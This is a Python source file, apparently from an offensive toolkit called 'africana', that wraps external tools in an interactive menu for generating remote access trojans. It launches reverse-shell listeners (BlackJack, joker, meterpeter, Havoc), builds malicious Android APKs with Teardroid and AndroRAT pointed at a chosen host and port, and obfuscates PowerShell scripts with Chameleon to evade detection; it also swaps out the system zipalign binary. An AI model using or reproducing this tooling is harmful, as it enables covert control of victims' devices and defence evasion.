import sys
import time
import socket
import subprocess
from src.core.banner import *
from src.core.bcolors import *
from src.core.essentials import *

class generator(object):
    def __init__(self):
        pass

    def shellz(self):
        os.system('clear')
        process = subprocess.Popen('cd src/externals/shells/; bash shells', shell = True).wait()
        return process

    def blackjack(self):
        choice = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Use" + bcolors.ENDC + ": " + bcolors.BLUE + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.BLUE + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + "Go back" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if choice == '0':
            sys.exit()
        elif choice == '1':
            lport = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lport" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "9999" + bcolors.GREEN + ")# " + bcolors.ENDC)
            if len (lport) == 0:
                lport = 9999
            os.system('cd src/externals/blackjack/; python3 BlackJack.py -i -s -n %s' %(lport))

        elif choice == '2':
            runner.kona_mbaya()
            lport = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lport" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "9999" + bcolors.GREEN + ")# " + bcolors.ENDC)
            if len (lport) == 0:
                lport = 9999
            hport = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Hport" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "3333" + bcolors.GREEN + ")# " + bcolors.ENDC)
            if len (hport) == 0:
                hport = 3333
            os.system('cd src/externals/blackjack/; python3 BlackJack.py -i -s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s' %(hport, lport))
        else:
            print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Choices are" + bcolors.ENDC + ": " + bcolors.BLUE + "1. " + bcolors.BLUE + "2. " + bcolors.BLUE + "or " + bcolors.BLUE + "0. " + bcolors.GREEN + ")# " + bcolors.ENDC)
            rat.blackjack()

    def powerjoker(self):
        print("")
        subprocess.Popen('ip addr', shell = True).wait()
        lhost = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s" %(runner.get_local_ip()) + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lhost) == 0:
            lhost = str(runner.get_local_ip())
        lport = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lport" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "9999" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lport) == 0:
            lport = 9999
            time.sleep(0.9)
        os.system('clear')
        process = subprocess.Popen('cd src/externals/joker/; python3 joker.py -l %s -p %s'%(lhost, lport), shell = True).wait()
        return process

    def meterpeter(self):
        os.system('clear')
        process = subprocess.Popen('cd src/externals/meterpeter/; pwsh meterpeter.ps1', shell = True).wait()
        return process

    def havoc(self):
        os.system('clear')
        process = subprocess.Popen('havoc client & havoc server -d -v', shell = True).wait()
        return process

    def teardroid(self):
        malware = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Output" + bcolors.ENDC + ":" + bcolors.BLUE + "Deafult" + bcolors.ENDC + ":" + bcolors.YELLOW + "africana.apk" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (malware) == 0:
            malware = 'africana.apk'
        os.system('clear')
        process = subprocess.Popen('cd src/externals/Teardroid-phprat/; python3 Teardroid.py -b %s' %(malware), shell = True).wait()
        return process

    def androrat(self):
        try:
            if os.path.exists('/usr/bin/zipalign.bak_africana'):
                pass
            elif not os.path.exists('/usr/bin/zipalign.bak_africana'):
                try:
                    os.system('mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; cd src/externals/androrat; apt install ./zipalign_8.1.0.deb --allow-downgrades -y')
                except:
                    os.system('cd src/externals/androrat; apt install ./zipalign_8.1.0.deb --allow-downgrades --allow-downgrades')
                    pass
        except:
            pass
        print("")
        subprocess.Popen('ip addr', shell = True).wait()
        lhost = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s" %(runner.get_local_ip()) + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lhost) == 0:
            lhost = str(runner.get_local_ip())
        lport = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lport" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "9999"+ bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lport) == 0:
            lport = 9999
        malware = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Output" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "(africana.apk)" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (malware) == 0:
            warn = bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Setting things up & Generating.." + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.YELLOW + "Android RAT" + bcolors.GREEN + ")#" + bcolors.ENDC
            for w in warn:
                sys.stdout.write(w)
                sys.stdout.flush()
                time.sleep(0.09)
            malware = 'africana'
        os.system('clear')
        process = subprocess.Popen('cd src/externals/androrat/; python3 androrat.py --build -i %s -p %s -o /root/.africana/%s%s' %(lhost, lport, malware, ".apk"), shell = True).wait()
        process = subprocess.Popen('cd src/externals/androrat/; python3 androrat.py --shell -i %s -p %s' %(lhost, lport), shell = True).wait()
        return process

    def chameleon(self):
        script = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")" + bcolors.GREEN + "(" + bcolors.DARKCYAN + "Full path to your .Ps1" + bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.RED + "Script:" + bcolors.YELLOW + "%s" %(script) + bcolors.GREEN + ")# " + bcolors.ENDC)
        output = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")" + bcolors.GREEN + "(" + bcolors.DARKCYAN + "Full path to save Output" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        subprocess.Popen('cd src/externals/chameleon; python3 chameleon.py -a -o %s %s' %(output, script), shell = True).wait()
        warn = bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Obfuscatin Done. Location" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.YELLOW + "%s" %(output) + bcolors.GREEN + ")#" + bcolors.ENDC
        for w in warn:
            sys.stdout.write(w)
            sys.stdout.flush()
            time.sleep(0.09)
        time.sleep(3)

    def chameleon_1(self):
        script = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")" + bcolors.GREEN + "(" + bcolors.DARKCYAN + "Full path to your .Ps1" + bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.RED + "Script:" + bcolors.YELLOW + "%s" %(script) + bcolors.GREEN + ")# " + bcolors.ENDC)
        output = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")" + bcolors.GREEN + "(" + bcolors.DARKCYAN + "Full path to save Output" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        subprocess.Popen('cd src/externals/chameleon; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"' %(script, output), shell = True).wait()
        warn = bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Obfuscatin Done. Location" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.YELLOW + "%s" %(output) + bcolors.GREEN + ")#" + bcolors.ENDC
        for w in warn:
            sys.stdout.write(w)
            sys.stdout.flush()
            time.sleep(0.09)
        time.sleep(3)

rat = generator()

if ' __name__' == '__main__':
        sys.exit(rat())
